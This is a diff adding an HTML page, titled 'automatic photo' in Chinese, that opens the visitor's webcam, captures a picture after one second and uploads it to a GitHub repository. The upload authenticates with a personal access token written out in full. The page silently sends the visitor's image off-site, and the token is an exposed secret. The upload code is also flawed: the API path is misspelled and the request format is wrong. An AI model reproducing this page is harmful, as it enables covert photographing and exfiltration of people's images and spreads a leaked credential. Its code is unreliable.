@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>自动拍照</title>
+</head>
+<body>
+<video id="video" width="640" height="480" autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+// 获取视频流
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(function(stream) {
+var video = document.getElementById('video');
+video.srcObject = stream;
+video.play();
+
+// 在获取视频流成功后自动执行拍照
+setTimeout(function() {
+    takePhoto();
+}, 1000);
+})
+.catch(function(err) {
+console.log('访问摄像头失败：', err);
+});
+
+// 拍照并上传到GitHub库
+function takePhoto() {
+var video = document.getElementById('video');
+var canvas = document.getElementById('canvas');
+var context = canvas.getContext('2d');
+context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+// 将照片转换为DataURL
+var dataURL = canvas.toDataURL('image/jpeg');
+
+// 创建一个新的图片文件
+var file = dataURLtoFile(dataURL, 'photo.jpg');
+
+// 创建一个FormData对象
+var formData = new FormData();
+formData.append('file', file);
+
+// 使用XMLHttpRequest上传照片到GitHub库
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://api.github.com/repos/bob-po/emm/contens/photo.jpg', true);
+xhr.setRequestHeader('Authorization', 'Bearer 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');
+xhr.onload = function() {
+if (xhr.status === 201) {
+console.log('照片上传成功！');
+} else {
+console.log('照片上传失败：', xhr.responseText);
+}
+};
+xhr.send(formData);
+}
+
+// 将DataURL转换为文件对象
+function dataURLtoFile(dataURL, filename) {
+var arr = dataURL.split(',');
+var mime = arr[0].match(/:(.*?);/)[1];
+var bstr = atob(arr[1]);
+var n = bstr.length;
+var u8arr = new Uint8Array(n);
+while (n--) {
+u8arr[n] = bstr.charCodeAt(n);
+}
+return new File([u8arr], filename, { type: mime });
+}
+</script>
+</body>
+</html>
